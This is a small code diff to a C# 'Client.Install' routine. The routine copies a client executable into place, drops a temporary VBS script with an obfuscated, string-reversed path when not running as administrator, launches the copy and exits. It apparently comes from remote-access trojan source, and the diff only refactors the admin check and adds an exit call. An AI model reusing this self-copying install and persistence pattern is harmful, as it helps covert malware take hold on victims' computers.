@@ -43,7 +43,7 @@ namespace Client.Install
                     fs.Write(clientExe, 0, clientExe.Length);
                     fs.Dispose();
 
-                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                    if (!Methods.IsAdmin())
                     {
                         string tempName = Path.GetTempFileName() + ".vbs";
                         string TempPath = Strings.StrReverse(Settings.ClientFullPath);
@@ -71,6 +71,7 @@ namespace Client.Install
                     }
                     Process.Start(Settings.ClientFullPath);
                     Methods.ClientExit();
+                    Environment.Exit(0);
                 }
             }
             catch (Exception ex)
